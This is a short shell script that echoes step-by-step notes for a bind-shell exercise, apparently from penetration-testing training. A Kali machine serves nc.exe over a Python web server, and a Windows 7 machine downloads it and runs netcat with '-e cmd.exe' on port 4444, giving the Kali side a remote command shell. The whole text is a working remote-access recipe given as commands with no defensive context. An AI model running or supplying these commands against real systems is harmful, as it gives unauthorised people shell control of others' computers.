echo '
--] BIND SHELL

OSCAR      === KALI
TANGO      === WINDOWS 7

OSCAR      ==> TASK ==> cd /usr/share/windows-binaries
OSCAR      ==> TASK ==> python -m SimpleHTTPServer 80
TANGO      ==> TASK ==> open iexplorer at http://IP_OSCAR/
TANGO      ==> TASK ==> take nc.exe
TANGO      ==> TASK ==> cmd.exe
TANGO      ==> TASK ==> cd Download
TANGO      ==> TASK ==> explorer .
TANGO      ==> TASK ==> nc.exe -nlvp 4444 -e cmd.exe
OSCAR      ==> TASK ==> nc -nv IP_TANGO 4444

'
read